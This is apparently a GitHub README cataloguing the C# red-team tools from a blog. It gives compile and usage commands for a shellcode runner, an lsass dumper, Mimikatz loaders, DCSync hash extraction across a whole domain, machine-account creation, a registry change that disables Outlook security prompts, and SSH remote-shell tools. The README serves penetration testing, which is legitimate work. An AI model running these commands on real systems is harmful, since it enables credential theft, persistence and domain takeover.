# Homework-of-C-Sharp
C Sharp codes of my blog.

---

### Shellcode.cs

Use CreateThread to run shellcode.

### ShellcodeBase64.txt

Base64 of the shellcode(msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp)

### ReadShellcode.cs

It will read ShellcodeBase64.txt and launch the shellcode.

---

### DumpLsass.cs

Source code is https://github.com/GhostPack/SafetyKatz

Remove some functions of the source code,only used of dumping lsass.exe to the current path.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe DumpLsass.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe DumpLsass.cs`


### SafetyKatz.cs

Use to run `sekurlsa::logonpasswords` and `sekurlsa::ekeys` on the minidump file of lsass.exe.

All code from https://github.com/GhostPack/SafetyKatz

I just modified a few lines of code so that it can be compiled by csc.exe.

Eg.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SafetyKatz.cs /unsafe`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SafetyKatz.cs /unsafe`

---

### GzipandBase64.cs

Use to generate the KatzCompressed string in PELoaderofMimikatz.cs

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe GzipandBase64.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe GzipandBase64.cs`

### PELoaderofMimikatz.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe PELoaderofMimikatz.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe PELoaderofMimikatz.cs`

### DcsyncofMimikatz.cs

This is the dcsync mode extracted from Mimikatz.

The source code in KatzCompressed is https://github.com/3gstudent/test/blob/master/Mimkatz-dcsync.zip

You can use https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs to generate the KatzCompressed string.

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe DcsyncofMimikatz.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe DcsyncofMimikatz.cs`

Usage:

`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /all /csv" exit`

`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /user:administrator /csv" exit`

---

### SharpMimikatz_x86.cs

Reference:Casey Smith's PELoader.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

This is a 32-bit version.

Complie:

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 SharpMimikatz_x86.cs`

or

`C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /unsafe /platform:x86 SharpMimikatz_x86.cs`

Usage:

`SharpMimikatz_x86.exe coffee exit`

### SharpMimikatz_x64.cs

Reference:Casey Smith's PELoader.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

This is a 64-bit version.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 SharpMimikatz_x64.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe /platform:x64 SharpMimikatz_x64.cs`

Usage:

`SharpMimikatz_x64.exe coffee exit`

### SharpPELoaderGenerater.cs

Use to generate SharpPELoader.cs

Modified by 3gstudent

Reference:Casey Smith's PELoader.cs

Usage:

`SharpPELoaderGenerater.exe <exe path>`

Eg.

`SharpPELoaderGenerater.exe mimikatz.exe`

SharpPELoaderGenerater will determine whether the exe is 32-bit or 64-bit and then generate the corresponding code.

More details:

[《通过.NET实现内存加载PE文件》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6/)
  
---

 ### AddMachineAccountofDomain.cs
 
Reference:https://github.com/pkb1s/SharpAllowedToAct

This code is just part of SharpAllowedToAct.

It can be used to add a Machine Account(User:testNew,Password:123456789).

This code can be complied by csc.exe or Visual Studio.

Supprot .Net 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe AddMachineAccountofDomain.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe AddMachineAccountofDomain.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll`
 
 ---
 
 ### mapi_tool.cs
 
Use MAPI to manage Outlook.
 
This code can be complied by csc.exe or Visual Studio.

Supprot .Net 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe mapi_tool.cs /r:Microsoft.Office.Interop.Outlook.dll`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe mapi_tool.cs /r:Microsoft.Office.Interop.Outlook.dll`

```
Usage:
     mapi_tool.exe GetAllFolders
     mapi_tool.exe GetConfig
     mapi_tool.exe ListMail <folder>
     mapi_tool.exe ListUnreadMail <folder>
Ex command:
     mapi_tool.exe GetConfigEx
     mapi_tool.exe GetContactsEx
     mapi_tool.exe GetGlobalAddressEx  
     mapi_tool.exe ListMailEx <folder>
     mapi_tool.exe ListUnreadMailEx <folder>
     mapi_tool.exe SaveAttachment <folder> <EntryID>  
     <folder>:Inbox/Drafts/SentItems/DeletedItems/Outlook/JunkEmail
Note:
     When the antivirus software is inactive or out-of-date,running Ex command will pop up a Outlook security prompt.
     You can modify the registry to turn off the Outlook security prompt.
     HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\x.0\Outlook\Security,DWORD:ObjectModelGuard,2
```

### Office14-Microsoft.Office.Interop.OutlookMicrosoft.Office.Interop.Outlook.dll

Use for Outlook 2010.

### Office15-Microsoft.Office.Interop.OutlookMicrosoft.Office.Interop.Outlook.dll

Use for Outlook 2013.

---

### BrailleToASCII.cs

Use to translate Braille Patterns to ASCII characters.

Support:`1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ),!/-.?;'$`

This code can be complied by csc.exe or Visual Studio.

Supprot .Net 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe BrailleToASCII.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe BrailleToASCII.cs`

---

### SSLCertScan

Use to scan the website SSL certificate.

Reference:https://github.com/ryanries/SharpTLSScan

This code can be complied by csc.exe or Visual Studio.

Supprot .Net 3.5 or later.

Complie:

```
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SSLCertScan.cs

or

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SSLCertScan.cs
```

---

### SharpSSHCheck_SSH.NET.cs

Use to check the valid credential of SSH(Based on SSH.NET).

Support password and privatekeyfile.

Reference:https://github.com/sshnet/SSH.NET

Note:

You need to reference Renci.SshNet.dll.

You can download Renci.SshNet.dll from https://github.com/sshnet/SSH.NET/releases/download/2016.1.0/SSH.NET-2016.1.0-bin.zip

Complie:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SharpSSHCheck_SSH.NET.cs /r:Renci.SshNet.dll
```

Usage:

```
      SharpSSHCheck_SSH.NET.exe <SSH ServerIP> <SSH ServerPort> <mode> <user> <password>
      <mode>:
      - plaintext
      - keyfile
```      
Eg:

```
      SharpSSHCheck_SSH.NET.exe 192.168.1.1 22 plaintext root toor
      SharpSSHCheck_SSH.NET.exe 192.168.1.1 22 keyfile root id_rsa
```

### SharpSSHRunCmd_SSH.NET

Remote command execution via SSH(Based on SSH.NET).

Support password and privatekeyfile.

Reference:https://github.com/sshnet/SSH.NET

Note:

You need to reference Renci.SshNet.dll.

You can download Renci.SshNet.dll from https://github.com/sshnet/SSH.NET/releases/download/2016.1.0/SSH.NET-2016.1.0-bin.zip

Complie:

```
      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SharpSSHRunCmd_SSH.NET.cs /r:Renci.SshNet.dll
```

Usage:

```
      SharpSSHRunCmd_SSH.NET.exe <SSH ServerIP> <SSH ServerPort> <mode> <user> <password> <cmd>
      <mode>:
      - plaintext
      - keyfile
If the <cmd> is shell,you will get an interactive shell.
```

Eg:

```
      SharpSSHRunCmd_SSH.NET.exe 192.168.1.1 22 plaintext root toor shell
      SharpSSHRunCmd_SSH.NET.exe 192.168.1.1 22 keyfile root id_rsa ps
```

---

### ListUserMailbyLDAP

Use to export all users' mail by LDAP.

Modified from https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts/blob/master/enumerateuser.cs

Complie:

```
      C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe ListUserMailbyLDAP.cs /r:System.DirectoryServices.dll
      or
      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ListUserMailbyLDAP.cs /r:System.DirectoryServices.dll
```

Usage:

```
      ListUserMailbyLDAP <LDAP ServerIP> <user> <password>
```

Eg:

```
      ListUserMailbyLDAP.exe 192.168.1.1 test1 password1
```


### List_passwordneverexpires_user_byLDAP

Use to export all users with password_never_expires by LDAP.


Complie:

```
      C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe List_passwordneverexpires_user_byLDAP.cs /r:System.DirectoryServices.dll
      or
      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe List_passwordneverexpires_user_byLDAP.cs /r:System.DirectoryServices.dll
```

Usage:

```
      List_passwordneverexpires_user_byLDAP <LDAP ServerIP> <user> <password>
```

Eg:

```
      List_passwordneverexpires_user_byLDAP.exe 192.168.1.1 test1 password1
```

### Add_passwordneverexpires_user_byLDAP

Use to set the selected user with password_never_expires by LDAP.

Complie:

```
      C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe Add_passwordneverexpires_user_byLDAP.cs /r:System.DirectoryServices.dll
      or
      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Add_passwordneverexpires_user_byLDAP.cs /r:System.DirectoryServices.dll
```

Usage:

```
      Add_passwordneverexpires_user_byLDAP <LDAP ServerIP> <user> <password> <target user> 
```         
Eg:

```
      Add_passwordneverexpires_user_byLDAP.exe 192.168.1.1 administrator password1 test1
```

---

### SqlClient.cs

From:https://github.com/FortyNorthSecurity/SqlClient

Use to query the MSSQL database.

Complie:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SqlClient.cs
```

or

```
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SqlClient.cs
```

---




